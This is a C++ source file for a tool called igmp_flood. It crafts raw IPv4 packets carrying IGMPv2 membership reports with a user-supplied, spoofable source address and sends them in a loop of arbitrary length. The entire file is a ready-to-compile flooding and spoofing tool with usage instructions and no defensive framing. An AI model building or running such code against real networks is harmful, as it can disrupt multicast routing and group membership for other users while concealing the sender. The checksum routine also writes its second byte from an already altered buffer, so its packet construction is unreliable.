// ============================================================
// igmp_flood.cpp — IGMP membership flood
// ------------------------------------------------------------
// Compile: clang++ -std=c++17 -O2 -o igmp_flood igmp_flood.cpp
// Usage:   sudo ./igmp_flood <src_ip> <group> <count>
// ============================================================
#include <sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <cstdio>
#include <cstdlib>
#include <cstring>

static uint16_t csum(const void* d, int n) {
    const uint16_t* p = (const uint16_t*)d; uint32_t s = 0;
    while (n > 1) { s += *p++; n -= 2; }
    if (n) s += *(const uint8_t*)p;
    while (s >> 16) s = (s & 0xffff) + (s >> 16);
    return ~s;
}

int main(int argc, char** argv) {
    if (argc < 4) return 1;
    int s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    int one = 1;
    setsockopt(s, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    sockaddr_in dst{};
    dst.sin_family = AF_INET;
    inet_pton(AF_INET, argv[2], &dst.sin_addr);

    char buf[64] = {0};
    auto* ip = (iphdr*)buf;
    uint8_t* igmp = (uint8_t*)(buf + sizeof(iphdr));

    ip->version = 4; ip->ihl = 5; ip->tot_len = htons(28);
    ip->ttl = 1; ip->protocol = 2; // IGMP
    inet_pton(AF_INET, argv[1], &ip->saddr);
    ip->daddr = dst.sin_addr.s_addr;
    ip->check = csum(ip, sizeof(iphdr));

    igmp[0] = 0x16; // v2 membership report
    igmp[1] = 0;    // max resp
    memcpy(igmp + 4, &dst.sin_addr, 4);
    igmp[2] = csum(igmp, 8) & 0xff;
    igmp[3] = (csum(igmp, 8) >> 8) & 0xff;

    int n = std::atoi(argv[3]);
    for (int i = 0; i < n; i++)
        sendto(s, buf, 28, 0, (sockaddr*)&dst, sizeof(dst));
    std::printf("[+] sent %d IGMP reports\n", n);
    return 0;
}
